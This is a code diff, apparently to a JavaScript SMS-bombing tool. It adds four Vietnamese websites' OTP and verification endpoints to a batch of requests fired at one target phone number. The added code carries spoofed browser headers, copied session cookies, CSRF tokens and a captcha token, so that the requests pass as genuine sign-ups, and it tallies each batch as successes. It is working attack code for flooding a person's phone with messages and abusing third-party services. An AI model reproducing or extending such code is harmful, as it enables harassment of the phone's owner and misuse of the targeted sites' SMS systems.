@@ -852,6 +852,74 @@ const payload = {
         'chntoken': '',
     };
 
+    const sapoLink = `https://www.sapo.vn/fnb/checkphonenumber?phonenumber=${phone}`;
+
+    const topenlandLink = `https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json?phoneNumber=${phone}`;
+
+    const nhadatHeaders = {
+    'Host': 'nhadat.cafeland.vn',
+    'content-length': '65',
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'x-requested-with': 'XMLHttpRequest',
+    'sec-ch-ua-mobile': '?1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform': '"Android"',
+    'origin': 'https://nhadat.cafeland.vn',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://nhadat.cafeland.vn/dang-ky.html',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4',
+    'cookie': 'laravel_session=eyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0=', 
+};
+
+     const nhadatData = {
+       'mobile': phone,
+       '_token': 'bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w', 
+     };
+
+    const nhaphangCookies = {
+      '_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D',
+        '_gcl_au': '1.1.1635282769.1685511240',
+        '_gid': 'GA1.2.147827434.1685511243',
+        '_gac_UA-53976512-2': '1.1685511243.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
+        '_gat_gtag_UA_53976512_2': '1',
+        '_dc_gtm_UA-53976512-2': '1',
+        'vid': '1468653',
+        '_gcl_aw': 'GCL.1685511244.CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
+        '_ga': 'GA1.1.1662212097.1685511243',
+        'amp_6e403e': 'jTngcjCrirFX_Elz6i7Gfl.Ym9kb2lxdWExODlAZ21haWwuY29t..1h1o4p61l.1h1o4pa8v.0.2.2',
+        '_ga_D022K7SJPP': 'GS1.1.1685511244.1.1.1685511263.41.0.0',
+    };
+
+    const nhaphangHeaders = {
+      'authority': 'www.nhaphang247.com',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'dnt': '1',
+        'origin': 'https://www.nhaphang247.com',
+        'referer': 'https://www.nhaphang247.com/huong-dan-dat-hang?utm_source=google&utm_medium=keywords&utm_campaign=adwords&gclid=CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
+        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+        'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==',
+        'x-requested-with': 'XMLHttpRequest',
+    };
+
+    const nhaphangData = {
+      'phone': phone,
+        'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x',
+    };
+
+
+
 
     // Initial message to be edited later
     let messageID = null;
@@ -937,6 +1005,10 @@ const payload = {
         axios.post('https://api.tiencash.com/v1/verify/sms/send', tiencashData, { headers: tiencashHeaders }),
         axios.get('https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json', chototParams, { headers: chototHeaders, cookies: chototCookies }),
         axios.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', cashbarData, { headers: cashbarHeaders }), 
+        axios.post(sapoLink), 
+        axios.post(topenlandLink), 
+        axios.post('https://nhadat.cafeland.vn/member-send-otp/', nhadatData, { headers: nhadatHeaders }),
+        axios.post('https://www.nhaphang247.com/site/get-code', nhaphangData, { headers: nhaphangHeaders, cookies: nhaphangCookies }),
         ])
       .then(() => {
         successCount += 31;
